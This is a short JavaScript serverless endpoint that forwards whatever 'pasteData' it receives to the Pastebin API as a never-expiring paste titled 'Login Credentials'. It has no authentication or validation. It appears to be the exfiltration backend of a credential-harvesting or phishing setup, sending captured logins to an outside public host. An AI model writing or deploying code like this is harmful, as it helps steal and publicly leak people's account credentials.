// api/pastebin.js

export default async function handler(req, res) {
    const apiKey = process.env.PASTEBIN_API_KEY; // Get API key from environment variables
    const { pasteData } = req.body;

    try {
        const response = await fetch('https://pastebin.com/api/api_post.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: new URLSearchParams({
                api_dev_key: apiKey,
                api_option: 'paste',
                api_paste_code: pasteData,
                api_paste_name: 'Login Credentials',
                api_paste_expire_date: 'N',
            })
        });

        const result = await response.text();
        res.status(200).send(result);
    } catch (error) {
        res.status(500).send('Error occurred');
    }
}
